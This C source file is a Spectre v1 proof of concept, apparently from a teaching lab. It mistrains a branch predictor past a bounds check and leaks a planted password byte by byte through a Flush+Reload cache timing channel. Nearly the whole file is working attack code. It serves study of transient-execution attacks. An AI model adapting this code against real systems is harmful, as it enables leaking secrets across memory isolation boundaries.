#include <assert.h>
#include <stdio.h>
#include <string.h>

#include "cacheutils.h"

__attribute__((aligned(PAGESIZE)))
char secret_password[PAGESIZE];
__attribute__((aligned(PAGESIZE)))
char api_array[PAGESIZE];
__attribute__((aligned(PAGESIZE)))
size_t api_array_size = 100;

__attribute__((aligned(PAGESIZE)))
char probe[256 * PAGESIZE];
__attribute__((aligned(PAGESIZE)))
char dummy[256 * PAGESIZE];

uint64_t cache_miss = -1;

///
/// Checks for valid index then accesses the 'api_array' array
///
char access_api(char* mem, int idx) {
  if ((float) idx >= 0.0 && (float) idx < (float)api_array_size) {
    maccess(mem + api_array[idx] * PAGESIZE);
    return mem[api_array[idx] * PAGESIZE];
  }
  return 0;
}

///
/// Initializes the victim state
///
void init_api_array() {
  for (size_t i = 0; i < 100; i++) {
    api_array[i] = i;
  }
  strcpy(secret_password, "CPV5_4R3_H4VNT3D!");
}


///
/// Bijective permutation of input and output (useful to prevent prefetching effects)
///
size_t get_permutated_index(size_t original_idx) {
  return ((original_idx * 167u) + 13u) & 255u;
}

uint64_t time_memory_access(void* addr) {
  uint64_t before = rdtsc();
  maccess(addr);
  uint64_t after = rdtsc();
  return after - before;
}

char leak_byte(int offset) {
  for (size_t i = 0; i < 300; i++) {
    // =========================
    // Step 1: Prepare Channel
    // =========================
    for (size_t j = 0; j < 256; j++) {
      flush(probe + j * PAGESIZE);
    }


    // =========================
    // Step 2: Mistrain Branch
    // =========================
    for (size_t j = 0; j < 30; j++) {
      int volatile x = access_api(dummy, 0);
      //printf("%x\n", x);
    }

    // ============================================
    // Step 3: Speculatively Access Out-of-Bounds
    // ============================================
    int malicious_offset = secret_password - api_array + offset;
    flush(&api_array_size);
    fence();
    int volatile x = access_api(probe, malicious_offset);

    // ===================
    // Step 4: Leak Data
    // ===================
    for (int j = 0; j < 256; j++) {
      int idx = get_permutated_index(j);
      if (time_memory_access(probe + idx * PAGESIZE) < cache_miss) {
        return idx;
      }
    }
  }
  return -1;
}

int main(int argc, char* argv[]) {

  // init API
  init_api_array();

  // init attacker stuff
  cache_miss = calibrate_flush_reload();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zd\n", cache_miss);
  memset(probe, 0, 256 * PAGESIZE);
  memset(dummy, 0, 256 * PAGESIZE);

  char leaked_string[18] = {0};
  while (strcmp(leaked_string, secret_password)) {
    for (size_t i = 0; i < 17; i++) {
      if (leaked_string[i] == '\0') {
        char leaked_byte = leak_byte(i);
        if (leaked_byte >= 0x20 && leaked_byte <= 0x5f) {
          leaked_string[i] = leaked_byte;
          printf("[+] Current Leak: %s\n", leaked_string);
        }
      }
    }
  }
  return 0;
}
